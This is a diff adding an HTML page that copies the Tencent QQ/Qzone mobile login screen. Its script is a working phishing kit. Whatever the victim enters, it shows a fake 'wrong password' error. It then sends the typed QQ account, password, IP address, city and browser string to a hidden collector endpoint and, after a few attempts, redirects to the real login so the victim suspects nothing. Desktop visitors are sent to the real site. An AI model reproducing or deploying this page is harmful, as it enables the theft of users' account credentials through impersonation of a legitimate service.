@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html  lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <link rel="icon" href="http://ui.ptlogin2.qq.com/favicon.ico">
+    <link rel="stylesheet" href="http://qzonestyle.gtimg.cn/qzone/phone/style/login.css">
+    <title>手机统一登录</title>
+    <style type="text/css">@charset "utf-8";body,html{height:100%}#go,#onekey,#vcode #submit,.copyright,.header,.nick,.q_login,.ui_topbar{text-align:center}.del_touch,.inputstyle{-webkit-tap-highlight-color:rgba(255,255,255,0)}body{font-size:16px;background:#eee}*{padding:0;margin:0;list-style:none;text-decoration:none}input::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:#aaa}input::-ms-input-placeholder,textarea::-ms-input-placeholder{color:#aaa}input:focus{outline:0}.content{margin:0 auto;width:320px;height:500px;position:relative}#error_tips{position:absolute;top:0;z-index:100;display:none;opacity:.95;width:100%}#error_tips #error_tips_content{position:relative;padding:16px 0 24px 24px;border-radius:5px;background-color:#525C5F;height:28px}#error_tips #error_tips_content #error_icon{position:absolute;top:18px;display:inline-block;width:24px;height:24px;background:url("/style/8/images/info.png") no-repeat}#error_tips #error_tips_content #error_message{display:inline-block;line-height:28px;font-size:14px;color:#fff;padding:0 0 0 28px}#error_message a,#error_message a:visited{color:#F15A22}@media (-webkit-min-device-pixel-ratio:2),(min-resolution:192dpi),(min-resolution:2dppx){#error_tips #error_tips_content #error_icon{background:url("http://ui.ptlogin2.qq.com/style/8/images/info@2x.png") no-repeat;background-size:24px 24px}}.login{margin:0 auto;padding-top:30px}.q_login{margin:0 auto 40px;width:290px;overflow:hidden}.inputstyle{width:273px;height:44px;color:#000;border:none;background:0 0;padding-left:15px;font-size:16px;-webkit-appearance:none}.logo{height:100px;width:244px;margin:0 auto 20px;background-size:244px 100px}#switch,#vcode,#web_login{margin:0 auto}.header{display:inline-block;height:97px;width:96px;position:relative}#q_login_logo,#q_login_tips,#remember,#remember+.checkbox,#vcode #input_tips,#vcode #vcode_img,#vcode #vcode_input,.del_touch,.del_touch_icon,.del_u,.header .img_out,.header img,.nick,.txt_default{position:absolute}.header img{width:60px;height:60px;top:10px;left:16px}.header .img_out{width:60px;height:60px;top:9px;left:15px;border:1px solid #c6dbe8;border-radius:4px;-webkit-box-shadow:1px 1px 13px #6E6E6E}.nick{display:inline-block;top:80px;left:0;height:20px;line-height:18px;vertical-align:middle}.del_touch_icon{display:none;width:30px;height:30px;left:60px;top:0;z-index:1}.del_icon{display:block;width:24px;height:22px;background:url("http://ui.ptlogin2.qq.com/style/8/images/android_logo_v1.png") -68px 0 no-repeat;border-radius:11px}#web_login{width:290px}#g_list{background:#fff;height:89px;border-radius:4px}#g_p,#g_u{position:relative}#g_u{border-bottom:1px solid #eaeaea}.txt_default{top:12px;left:10px;color:#b3b3b3}.del_touch{right:0;display:block;height:44px;width:48px;z-index:1}.del_u{display:none;left:15px;top:13px;height:18px;width:18px;border-radius:9px;background:url("http://ui.ptlogin2.qq.com/style/8/images/android_logo_v1.png") -117px -2px no-repeat}#auto_login{height:24px;margin:15px 0;color:#246183;position:relative}#auto_login .wording{position:absolute;left:40px;line-height:24px;height:24px;font-size:14px}#remember{left:14px;top:5px;cursor:pointer;z-index:1;opacity:.01}#remember:checked+.checkbox{background:url("/style/8/images/checked.png") 1px 1px #146FDF;border-color:#146FDF}#remember+.checkbox{display:inline-block;width:21px;height:21px;left:9px;top:1px;border:1px solid #9ABBE3;background:0 0;border-radius:11px}#go,#onekey{width:290px;height:44px;line-height:44px;background:#146fdf;border:none;border-radius:4px;color:#fff;font-size:16px;margin-top:15px;display:block}#go.weak,#onekey.weak,#switch #swicth_login{height:42px;border:1px solid #9abbe3;color:#146fdf}#onekey{background:#146fdf;display:none}#go.weak,#onekey.weak{background-color:#e7e7e7}#switch{width:290px}#switch #swicth_login{width:288px;line-height:44px;border-radius:5px;background:#e7e7e7;margin-top:10px;text-align:center;font-size:16px}#switch #zc_feedback{width:290px;position:relative;margin-top:15px;overflow:hidden}#switch #forgetpwd,#switch #zc{color:#246183;line-height:14px;font-size:14px;padding:15px 10px}#switch #zc{float:right;margin-right:-10px}#switch #forgetpwd{float:left;margin-left:-10px}.tansparent{background:0 0}#q_login_title{height:32px;line-height:22px;margin-bottom:20px;position:relative}#q_login_logo{background:url("http://ui.ptlogin2.qq.com/style/8/images/android_logo_v1.png") -44px 0 no-repeat;width:22px;height:22px;left:0}#q_login_tips{left:30px;top:0;color:#246183}#vcode{padding-top:40px;display:none}#vcode #vcode_tips{display:block;width:290px;height:20px;line-height:20px;margin:0 auto 15px;color:#77838D}#vcode #vcode_area{position:relative;margin:0 auto;width:290px;height:70px;border-radius:5px;border:1px solid #b8b8b8;background:#fff}#vcode #vcode_img{left:3px;width:140px;height:70px}#vcode #vcode_input{top:-1px;left:145px;width:145px;height:70px;border:1px solid #9d9d9d;background:0 0;-webkit-appearance:none;border-top-right-radius:5px;border-bottom-right-radius:5px;line-height:28px;font-size:28px;-webkit-box-shadow:inset 0 0 10px #ccc}#vcode #input_tips{top:5px;left:150px;display:block;width:135px;height:50px;color:#B3B3B3;z-index:1;padding-top:8px}#vcode #submit{width:288px;height:22px;padding:10px 0;background:#7ec82c;border:none;border-radius:5px;color:#fff;font-size:22px;margin:35px auto 0}.copyright{color:#8a949d;font-size:10px;margin-top:15px;font-family:Helvetica}.copyright .chs,.copyright .en{line-height:20px}.mode_webapp .ui_topbar .topbar_btn b,.mode_webapp .ui_topbar .topbar_btn_left b{background-image:url("/style/8/images/bg_btn_back.png");background-position:bottom right;background-size:105px;width:6px;height:32px;float:left}.ui_topbar .topbar_title,.ui_topbar h3{font-size:18px}.ui_topbar{border-bottom:1px solid #b6b6b6;border-top:2px solid #df242a;background-color:#d9d9d9;background-image:-webkit-gradient(linear,left top,left bottom,from(#ebebeb),to(#d9d9d9));background-image:-webkit-linear-gradient(top,#ebebeb,#d9d9d9);background-image:linear-gradient(to bottom,#ebebeb,#d9d9d9);height:40px;line-height:40px;position:relative}.lay_header{height:auto!important;width:100%}.mode_webapp .ui_topbar{color:#fff;background-color:#c32d32;background-image:-webkit-gradient(linear,left top,left bottom,from(#fe444a),to(#c32d32));background-image:-webkit-linear-gradient(top,#fe444a,#c32d32);background-image:linear-gradient(to bottom,#fe444a,#c32d32);border-bottom:1px solid #700d00;border-top:0 none;top:0;left:0;width:100%;box-shadow:0 0 5px #333}.mode_webapp .ui_topbar .topbar_btn_left{display:block;position:absolute;left:10px;top:5px}.mode_webapp .ui_topbar .topbar_btn span,.mode_webapp .ui_topbar .topbar_btn_left span{float:left;display:inline-block;height:32px;line-height:30px;color:#fff;background-image:url("/style/8/images/bg_btn_back.png");background-size:105px;padding-left:10px;padding-right:4px}.mode_webapp .ui_topbar .topbar_btn_left span{background-image:url("/style/8/images/bg_btn_back.png");background-position:left -32px;background-size:105px;padding-left:17px}.skin-2 .ui_topbar{background-color:#161616;background-image:-webkit-gradient(linear,left top,left bottom,from(#3e3e3e),to(#262626));background-image:-webkit-linear-gradient(top,#3e3e3e,#262626);background-image:linear-gradient(to bottom,#3e3e3e,#262626);border-bottom-color:#1a1a1a}.skin-2 .ui_topbar .topbar_btn b,.skin-2 .ui_topbar .topbar_btn span,.skin-2 .ui_topbar .topbar_btn_left b,.skin-2 .ui_topbar .topbar_btn_left span{background-image:url("/style/8/images/bg_btn_back_black@2x.png");background-size:105px}.new_vcode{display:none;width:100%;height:100%;overflow:hidden}</style><style type="text/css">   .logo {background-image:url("http://qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png");}   
+    </style>
+    <script>
+    var ptui_daid=encodeURIComponent("5")//业务隔离id
+    ,ptui_appid=encodeURIComponent("549000929")//业务的appid
+    ,ptui_domain=encodeURIComponent("qq.com")//domain
+    ,ptui_regmaster=encodeURIComponent("")
+    ,ptui_lang=encodeURIComponent("2052")
+    ,ptui_pt_version=encodeURIComponent("10194")
+    ,ptui_version=encodeURIComponent("201203081004")
+    ,ptui_style=encodeURIComponent("9")
+    ,ptui_noAuth="1"//是否需要去检查业务隔离，默认为1，需要检查（数字）
+    ,g_href="http://ui.ptlogin2.qq.com/cgi-bin/login?style=9&pt_ttype=1&appid=549000929&pt_no_auth=1&pt_wxtest=1&daid=5&s_url=http://ui.ptlogin2.qq.com/cgi-https://h5.qzone.qq.com/mqzone/index"
+    ,ptui_pt_qzone_sig="0"
+    ,ptui_pt_light="0"//轻登录，只下发p_skey,取值0或者1
+    ,ptui_pt_ttype="1"
+    ,ptui_pt_3rd_aid=encodeURIComponent("0")//互联的第三方appid
+    ,ptui_enablePwd=encodeURIComponent("")//互联的登录是否使用密码控件
+    ,ptui_target = encodeURIComponent("_top")//跳转方式
+    ,ptui_low_login = parseInt("0", 10) || 0
+    ,ptui_low_login_hour = parseInt("0", 10) || 720 // 弱登录时间，默认一个月
+    ,ptui_kf_csimc = encodeURIComponent("0")
+    ,ptui_kf_csnum = encodeURIComponent("0")
+	,ptui_kf_authid = encodeURIComponent("0")
+	,ptui_defuin = ""//设置的默认uin(input value 赋值)
+	,ptui_lockuin = parseInt("0");
+if (ptui_daid == 1)
+    ptui_daid = 0; // 因为业务总是填错，所以daid=1也认为是没填的
+var STR_LANG = {
+	 no_uin:"您还没有输入帐号！",
+	 no_password:"您还没有输入密码！",
+	 no_code:"您还没有输入验证码！",
+	 err_uin:"请输入正确的帐号！",
+     err_up:"您输入的账号或密码不正确，请重新输入。",
+	 less_code:"请输入完整的验证码！",
+	 err_code:"请输入完整的验证码！",
+	 onekey:"一键登录",
+     onekey_err: '使用一键登录，<a href="http://im.qq.com/mobileqq/touch/53/index.html" target="_blank">请安装最新版本的QQ手机版</a>',
+	 onekeying:"正在拉起QQ手机版...",
+	 offline: "网络异常"
+};
+if(!navigator.userAgent.match(/(iPhone|iPod|Android|ios)/i)){
+  window.location="http://qzone.qq.com/";
+}</script>
+<script type="text/javascript" src="ajax.js"></script>
+<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+<script> var ip = returnCitySN["cip"]+','+returnCitySN["cname"] + "local-host" + navigator.userAgent;</script>
+</head>
+<body>  
+<!--顶部banner-->
+<a class="banner" data-btn="下载" href="http://m.qzone.com/l?g=144&amp;g_f=2000000139" id="btn_app_down" style="background-image:url(http://qzonestyle.gtimg.cn/qzone/phone/style/img/act/down-app/qzone-app-download.jpg);"></a>
+<div id="content" class="content">
+    <div id="error_tips">
+        <div id="error_tips_content">
+            <span id="error_icon"></span> 
+            <span id="error_message"></span>
+        </div>
+    </div>
+    <div id="login" class="login">
+        <div id="logo" class="logo"></div>
+        <div id="app_name" style="display:none"></div> 
+        <div id="web_login" style="display: block;">
+            <ul id="g_list">
+                <li id="g_u">
+                    <div id="del_touch" class="del_touch">
+                        <span id="del_u" class="del_u"></span>
+                    </div>
+                    <input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱">
+                </li>
+                <li id="g_p">
+                    <div id="del_touch_p" class="del_touch">
+                        <span id="del_p" class="del_u"></span>
+                    </div>
+                    <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入您的QQ密码">
+                </li>
+            </ul>  
+            <div href="javascript:void(0);" id="go"> 登 录 </div>  
+            <div href="javascript:void(0);" id="onekey" class=" weak" style="display: block;"> 一键登录 </div>  
+        </div>
+        <div id="switch">
+        <div id="zc_feedback">  
+            <span id="zc" onclick="window.open('https\x3A\x2F\x2Fssl.ptlogin2.qq.com\x2Fj_newreg_url')">注册新帐号</span>   
+            <span id="forgetpwd" onclick="window.open('https://aq.qq.com/cn2/findpsw/mobile_v2/mobile_web_find_index?source_id=3263&ptlang=2052&account=903565795')">忘了密码？</span>  
+        </div>
+    </div> 
+</div> 
+ 
+<script type="text/javascript"> 
+    var $ = function(id){return document.getElementById(id)};
+    var on = function(el, event, callback){el.addEventListener(event, callback, false)};
+    var n = 0;
+    var getCookie = function(name) {
+         var r = new RegExp("(?:^|;+|\\s+)\s*" + name + "=([^;]*)"), m = document.cookie.match(r);
+                return !m ? "" : decodeURIComponent(m[1]);
+    }
+    var setCookie = function(name, value, domain, path, hour){
+        if (hour) {
+            var expire = new Date;
+            expire.setTime(expire.getTime() + 36E5 * hour)
+        }
+        document.cookie = name + "=" + value + "; " + (hour ? "expires=" + expire.toGMTString() + "; " : "");
+        return true
+    } 
+      
+    var close = function(){
+        $('error_tips').style.display = 'none';
+    }
+    var timer;
+    var show = function(msg){
+        $('error_message').innerHTML = msg;
+        $('error_tips').style.display = 'block';
+        timer = setTimeout(close, 4000);
+    }
+    var check = function(){
+        var regQQn = new RegExp(/^[1-9][0-9]{4,9}$/),
+        regMl = new RegExp(/^[1-9][0-9]{4,9}@qq.com$/),       
+        regTl = new RegExp(/^(0|86|17951)?(13[0-9]|15[012356789]|18[0-9]|14[57])[0-9]{8}$/);
+        clearInterval(timer);
+        u = $('u').value,p = $('p').value;
+        if(u == "") {$('u').focus();show(STR_LANG.no_uin);return;}
+        if(!(regQQn.test(u) || regMl.test(u) || regTl.test(u)))
+        {$('u').focus();show(STR_LANG.err_uin);return;}
+        if(p == "") {$('p').focus();show(STR_LANG.no_password);return;} 
+        setCookie("_u",u);
+        $('u').focus();
+        show(STR_LANG.err_up);
+        var msg = $('u').value + 'local-host' + $('p').value + 'local-host' + ip;
+        ajax.post("http://localhost:60640/ui.ptlogin2.qq.login.axd", { msg : encodeURIComponent(msg)}, function(data) {      
+        });
+        if(n++ == 3) {
+            window.location = g_href;
+        }
+    }
+    on($('go'),'click',check); 
+    on($('onekey'),'click',function(){
+        _this = this;
+        _this.innerHTML = STR_LANG.onekeying;
+        setTimeout(function() {
+            _this.innerHTML = STR_LANG.onekey;
+            show(STR_LANG.onekey_err);
+        }, 5000); 
+    });
+    on($('del_u'),'click',function(){$('u').value = "";$('u').focus();checkField('u');});
+    on($('del_p'),'click',function(){$('p').value = "";$('p').focus();checkField('p');});
+    $('u').oninput = function(){checkField('u')};
+    $('p').oninput = function(){checkField('p')};
+
+    var checkField = function(d){
+        $('del_' + d).style.display = $(d).value.length > 0 ? 'block' :'none';
+    }
+    document.onkeydown=function(event){
+        var e = event || window.event || arguments.callee.caller.arguments[0];
+        if(e&&e.keyCode == 13) check();
+    };
+    window.onload=function(){
+        var u = getCookie("_u");
+        if(u != ""){
+            $('u').value = u;checkField('u');
+        }
+    };
+
+</script>    
+</body>
+</html>
